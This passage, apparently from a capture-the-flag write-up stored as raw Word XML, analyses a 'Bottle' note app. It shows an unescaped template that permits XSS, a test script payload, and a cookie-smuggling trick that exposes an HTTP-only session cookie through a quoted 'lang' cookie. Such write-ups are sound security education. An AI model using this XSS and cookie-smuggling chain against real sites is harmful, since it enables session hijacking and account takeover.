      </w:r>
    </w:p>
    <w:p w14:paraId="4A524A6A" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The bot will execute any JavaScript embedded in the notes it visits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FDAA7D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XSS Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B82500F" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>Examining the template for note previews reveals a critical vulnerab</w:t>
      </w:r>
      <w:r>
        <w:t>ility:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21461057" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodehtml"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">&lt;!-- From </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>note_preview.tpl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> --&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;div class="note-preview"&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    {{!note['content']}}</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17ED989F" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>{{!note['content']}}</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is significant - it instructs the template engine to render content without HTML escaping. This allows us to inject arbitrary HTM</w:t>
      </w:r>
      <w:r>
        <w:t>L and JavaScript that will execute when the note is viewed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1104DC63" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>To verify this, we can create a simple test note with the content:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02878687" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodehtml"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;script&gt;alert('XSS works!');&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2440A43D" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>When we preview this note, the JavaScript executes, confirming the XSS vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE97EAB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 xml:space="preserve">Flag </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Protection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAD540B" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The flag endpoint is protected by multiple security checks:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7DEF62" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodepython"/>
      </w:pPr>
      <w:r>
        <w:t>@app.route('/admin/flag')</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>admin_flag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>():</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>session_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>get_custom_cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>('session', signed=True)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    # Check admin authentication</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    if not </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>is_authenticated</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>session_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">) or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>get_us</w:t>
      </w:r>
      <w:r>
        <w:t>er_from_session</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>session_id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) != 'admin':</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        redirect('/admin-login')</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>real_ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>request.remote_addr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>f"Real</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> IP: {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>real_ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>}")</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    # Block localhost IPs directly without relying on hostname lookup</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>real_ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> == '127.0.0.1' or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>real_ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> == ':</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">:1' or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>real_ip.startswith</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>('127.'):</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        return "Access denied from localhost."</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        hostname = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>socket.gethostbyaddr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>real_ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)[0]</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>f"Resolved</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> hostname: {hostname}")</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        hostname = ""</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>f"</w:t>
      </w:r>
      <w:r>
        <w:t>Hostname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> lookup failed: {e}")</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    if 'localhost' in hostname:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        return "Access denied."</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    # GET THE FLAG FROM DF OR READ IT FROM flag.txt</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    flag = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>os.environ.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>('DF', '{Flag not set}') or open('flag.txt').read().strip()</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>f"Flag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> retriev</w:t>
      </w:r>
      <w:r>
        <w:t>ed: {flag}")</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    return template('...', flag=flag)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C553DB8" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>This code reveals several security layers:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2DA1C0" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Authentication check - requires a valid admin session cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA2F76C" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>IP restrictions - blocks access from localhost (127.0.0.1, ::1, etc.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FADEAC" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Hostname verification - blocks </w:t>
      </w:r>
      <w:r>
        <w:t>hostnames containing "localhost"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3D50D1" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">These restrictions prevent us from making the admin bot directly visit the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/admin/flag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> endpoint, as the bot runs from localhost. Instead, we'll need to steal the admin's session cookie and use it from our own machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A521DB7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Diving Deeper: Cookie Handling and Security</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4AF3BB" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>Let's examine how cookies are processed in the application. The Bottle framework</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> uses custom cookie handling:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35754F9C" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodepython"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>get_custom_cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(name, default=None, signed=False):</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    value = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>request.cookies.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(name, default)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    if signed and value is not default:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        # Signature validation code...</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    return value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707BE51E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie controls t</w:t>
      </w:r>
      <w:r>
        <w:t>he language displayed, which is rendered in the HTML:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C119ABF" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodehtml"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;html lang="{{lang}}"&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;!-- Page content... --&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6A6C20" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">This means the value of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie is directly inserted into the HTML output.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC2E031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Searching for Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021F861B" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">Given that the challenge name is </w:t>
      </w:r>
      <w:r>
        <w:t>"Bottle" and focuses on HTTP-only cookies, we should investigate if there are known vulnerabilities in the Bottle framework's cookie handling.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E68662B" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">Searching for "cookie smuggling bottle" leads to a blog post </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Cookie Bugs - Smuggling &amp; Injection</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> that reveals a critical vulnerability in how the Bottle framework parses cookies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5624477B" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>According to the a</w:t>
      </w:r>
      <w:r>
        <w:t>rticle:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D70B94" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">"I found that several webservers perform incorrect cookie string parsing. Whenever the parser encountered a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>dquoted</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookie value, it continued to read the cookie string – even if a semicolon is encountered! The semicolon is supposed to separate KV </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>pairs, so surely that can't be right."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE41B0F" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>This behavior stems from differences between two RFCs (Request for Comments) that define how cookies should be handled:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55EEF6AC" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RFC2965</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (older) - Uses RFC2616's definition of quoted strings, which allows semicolons inside quo</w:t>
      </w:r>
      <w:r>
        <w:t>ted values</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7A17CC" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RFC6265</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (newer) - More restrictive, doesn't allow certain characters (including semicolons) in cookie values</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EFDBDB" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The article specifically mentions Bottle among the vulnerable frameworks:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD225DD" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">"This includes the Python web servers/frameworks: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cherrypy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, we</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">b.py, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>aiohttp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> server, bottle, and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>webob</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Pyramid, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>TurboGears</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0203902A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Understanding Cookie Smuggling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBE5EEB" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>To illustrate the vulnerability, let's consider a standard cookie header:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4C3809" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:t>Cookie: lang=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; session=eb600456809aa20460de4bd1da503129|1748519159|ddXX0inNh9lMGP0VwfG</w:t>
      </w:r>
      <w:r>
        <w:t>RsErRU6jWulbvqZ-7ZbmcZwo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660E99DE" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>Browsers and servers are supposed to parse this into two separate cookies:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5931C95E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lang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with value </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6606EE51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session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with value </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>eb600456809aa20460de4bd1da503129|1748519159|ddXX0inNh9lMGP0VwfGRsErRU6jWulbvqZ-7ZbmcZwo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F18B18" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>However, if we introduce quote</w:t>
      </w:r>
      <w:r>
        <w:t>s in a specific way:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7771E03F" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:t>Cookie: lang="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; session=eb600456809aa20460de4bd1da503129|1748519159|ddXX0inNh9lMGP0VwfGRsErRU6jWulbvqZ-7ZbmcZwo"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B4CA7E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The Bottle framework (following RFC2965 parsing logic) will incorrectly parse this as a single cookie:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C93C7C" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>lang</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with value </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>; session=eb600456809aa20460de4bd1da503129|1748519159|ddXX0inNh9lMGP0VwfGRsErRU6jWulbvqZ-7ZbmcZwo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03222C6E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>This causes a "parser differential" - where the browser and server interpret the same cookie header differently.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510F2119" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">To test this theory, we can manually modify </w:t>
      </w:r>
      <w:r>
        <w:t>our request using a proxy tool and observe that the application renders:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C758B35" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodehtml"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;html lang="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; session=eb600456809aa20460de4bd1da503129|1748519159|ddXX0inNh9lMGP0VwfGRsErRU6jWulbvqZ-7ZbmcZwo"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546A59E7" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>This confirms that:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F07D11B" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">The vulnerability exists in this </w:t>
      </w:r>
      <w:r>
        <w:t>application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39EDB8A6" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>We can potentially smuggle the HTTP-only session cookie into the non-HTTP-only lang cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD188DA" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The smuggled cookie becomes part of the page's HTML output, making it accessible to JavaScript</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547BF726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The Cookie Ordering Challenge</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C552A2" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">The challenge now </w:t>
      </w:r>
      <w:r>
        <w:t>becomes: How do we manipulate cookie ordering to create this malformed format when we can't directly modify HTTP-only cookies through JavaScript?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FFE4EC" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>According to the article, browser cookie ordering follows specific rules:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31FE03EF" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Path length (longest to shortest)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E9A543" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>La</w:t>
      </w:r>
      <w:r>
        <w:t>st updated time (least recent to most recent)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3675F972" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
